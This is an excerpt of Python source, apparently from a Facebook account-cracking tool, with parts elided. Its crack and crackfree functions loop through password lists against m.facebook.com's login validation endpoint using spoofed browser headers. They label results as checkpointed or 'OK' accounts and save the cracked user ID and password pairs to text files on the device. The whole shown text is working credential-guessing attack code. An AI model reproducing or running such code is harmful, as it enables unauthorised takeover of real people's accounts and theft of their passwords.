...
def crack(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-site","sec-fetch-mode":"navigate","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US,en;q=0.9"})
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;91m[Sheikh-CP] {idf} • {pw}')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;91m[{time.strftime("%H:%M")}•Sheikh-CP] {idf} • {pw}')
                os.system('espeak -a 300 " Bad,  Luck,  Cp,  ID"')
                open('/sdcard/Sheikh-Cp.txt', 'a').write( uid+' | '+ps+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[1;32m[{time.strftime("%H:%M")}•Sheikh-OK] {idf} • {pw} ')
                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  AN,  OK,  id"')
                open('/sdcard/Sheikh-Ok.txt', 'a').write( uid+' | '+ps+'\n')
                break
